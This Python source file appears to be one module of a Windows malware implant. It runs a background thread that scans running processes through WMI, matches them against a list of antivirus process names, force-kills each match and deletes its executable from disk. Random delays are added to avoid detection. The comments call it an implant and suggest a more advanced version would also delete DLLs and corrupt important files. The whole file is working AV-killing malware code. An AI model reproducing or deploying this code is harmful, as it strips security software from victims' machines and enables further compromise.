import os
import time
import random
import pythoncom
import wmi
import threading
import win32api
import win32con
import win32process

from config import *
from core import *

from badprocs import BadProcesses

# This is a simple example of how an implant could simply ask AVs to quit()
# A more advanced technique might include deleting DLLs and corrupting important files
class KAVThread(threading.Thread):
    drmwmi = None # lol

    def __init__(self):
        threading.Thread.__init__(self)
        print("init")

    def run(self):
        pythoncom.CoInitialize()
        self.drmwmi = wmi.WMI()
        while (True):
            for process in self.drmwmi.Win32_Process():
                for selectedProcess in BadProcesses:
                    try:
                        if selectedProcess.lower() in process.Name.lower():
                            try:
                                handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, process.ProcessId)
                                filename = win32process.GetModuleFileNameEx(handle, 0)
                                if os.path.isfile(filename) and not DEBUG_MODE:
                                    execute("taskkill", ("/F", "/IM", filename), True)
                                    time.sleep(random.randint(1, 4))
                                    os.remove(filename)
                            except Exception as e:
                                pass
                            process.Terminate()
                    except Exception as e:
                        pass
            time.sleep(random.randint(1, 10))